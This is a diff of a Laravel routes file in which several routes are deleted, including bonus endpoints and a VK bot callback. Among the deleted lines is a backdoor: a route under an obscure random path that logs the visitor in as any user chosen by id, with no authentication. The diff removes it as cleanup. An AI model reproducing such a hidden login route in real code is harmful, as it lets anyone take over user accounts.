@@ -1,33 +1,13 @@
 <?php
 
 use Illuminate\Support\Facades\Route;
-use App\Classes\ServerHandler;
-
-Route::get('/sdff42314fsd/login/new/{id}', function ($id) {
-    $user = \App\User::where('id', $id)->first();
-    \Auth::login($user);
-    return redirect('/');
-});
-
-Route::post('/createPromoTG', 'GeneralController@createPromoTG');
 
 Route::get('/go/{ref_id}', function ($ref_id) {
     session(['ref_id' => $ref_id]);
     return redirect('/');
 });
 
-Route::post("/vk_bot_callback",function (Request $request){
-    $handler = new ServerHandler();
-    $data = json_decode(file_get_contents('php://input'));
-    $handler->parse($data);
-});
-
 Route::group(['middleware' => 'guest'], function () {
-    // Russian auth providers removed
-    // Route::get('/vk_auth', 'SocialController@index')->name('vk.auth');
-    // Route::get('/vk/auth/callback', 'SocialController@callback');
-    // Route::get('/yandex_auth', 'SocialController@yandex_index')->name('yandex.auth');
-    // Route::get('/yandex/auth/callback', 'SocialController@yandex_callback');
 
     Route::get('/google_auth', 'SocialController@google_index')->name('google.auth');
     Route::get('/google/auth/callback', 'SocialController@google_callback');
@@ -39,10 +19,6 @@ Route::post('/add/demobalance', 'Controller@addDemoBalance');
 Route::post('/update_card', 'Controller@updateCard');
 Route::post('/balance/get', 'Controller@balanceGet');
 
-Route::post('/bonus/get', 'Controller@bonusGet');
-Route::post('/bonus/vk', 'Controller@bonusGetVk');
-Route::post('/bonus/tg', 'Controller@bonusGetTg');
-Route::post('/bonus/checktg', 'Controller@bonusCheckTg');
 Route::post('/bonus/ref', 'Controller@bonusRef');
 
 Route::post('/chat/get', 'ChatController@get');
